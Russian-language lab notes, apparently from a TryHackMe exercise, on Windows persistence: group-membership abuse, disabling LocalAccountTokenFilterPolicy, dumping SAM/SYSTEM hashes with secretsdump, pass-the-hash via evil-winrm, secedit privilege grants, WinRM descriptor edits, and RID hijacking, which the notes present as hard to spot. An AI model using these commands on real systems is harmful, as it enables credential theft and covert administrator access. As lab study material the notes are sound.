#### Assign Group Memberships(Назначение членства в группах) ####
net localgroup administrators user /add


## 1. Добавление в группу Backup Operators(не имеет админ. доступ, но имеет доступ к чтению и записи файлов, а также реестру)
net localgroup "Backup Operators" thmuser1 /add
## 2. Добавить в группу rdp или winrm для повторного подключения( если мы взломали хэш и знаем пароль)
net localgroup "Remote Management Users" thmuser1 /add
net localgroup "Remore Desktop Users" thmuser1 /add
## 3. Мы в группу backup operators, но при подключении удаленно группа disabled, из за UAC(User Access Control) параметра LocalAccountTokenFilterPolicy, чтобы вернуть админ привелегии нужно выключить LocalAccountTokenFilterPolicy установив в реестре значение 1 за юзера с административным доступом:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
## 4. Приступаем к резервной копии файлов SAM и SYSTEM
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
## 5. Получаем хэши паролей всех юзеров с помощью пакета impacket и скрипта secretdump.py
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
## 6. Используем  Pass-the-Hash(взломанный хэш) для доступа к учетной записи администратора
evil-winrm -i ip -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3

#### Special Privileges and Security Descriptors ####
# Не обязательно добавлять пользователя в группу Backup Operators, можно добавить привелегии, которые соответствуют этой группе, чтобы был доступ к чтению и редактированию файлов в системе. Нужные привелегии:
* SeBackupPrivilege(read files)
* SeBackupPrivilege(write files)

## 1. Экспортируем текущую конфигурацию безопасности системы, включая назначенные права пользователей во временный файл
secedit /export /cfg config.inf
## 2. Открываем файл и к нужным привелегиям добавляем юзера
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551, thmuser2
## 3. Конвертируем .inf файл в .sdb, а затем загружаем в систему
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
## 4. Теперь у юзера есть привелегии эквиваленто группе Backup Operators, но он по прежнему не может подключиться через winrm. Это можно исправить не добавляя его в нужную группу, а с помощью security descriptor. Открыть конфигурацию дескриптора winrm можно командой(POWERSHELL!),открывается окно, добавляем пользователя, ставим галку full control.
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
## 5. Теперь может подключаться через winrm и если посмотреть этого пользователя через net user thmuser2, то не будет абсолютно ничего подозрительного!


#### RID(Relative ID) Hijacking ####
# Можно изменить некоторые значения реестра, чтобы система считала пользователя администратором
# Пользователь создан ему присваивается RID, соответствующий процесс отвечающий за безопасность(LSASS) в соответствии с RID создает токен, асоциирующийся с этим RID. Мы можем подменить RID
# По дефолту у администратора RID=500, а пользвателей > 1000

## 1. Проверить wmic пользователей
wmic useraccount get name,sid
## 2. Нам нужен доступ к SAM через REGEDIT. Но такого доступа нет даже у администратора. Используется утилита psexec
PsExec64.exe -i -s regedit
## 3. Переходим в HKLM\SAM\SAM\Domains\Account\Users\ и ищем юзера с соответствующим RID. Например (1010 в HEX это 0x3F2)(в python hex(1010)). Под этим ключом будет значение F, которое содержит RID на позиции 0x30 (там будет F2 03)
## 4. Теперь мы заменим эти два байта на RID администратора в шестнадцатеричном формате (500 = 0x01F4), меняя байты на F401:
## 5. При следующем входе LSASS посмотрит RID и даст юзеру соответствующие привелегии и роль администратора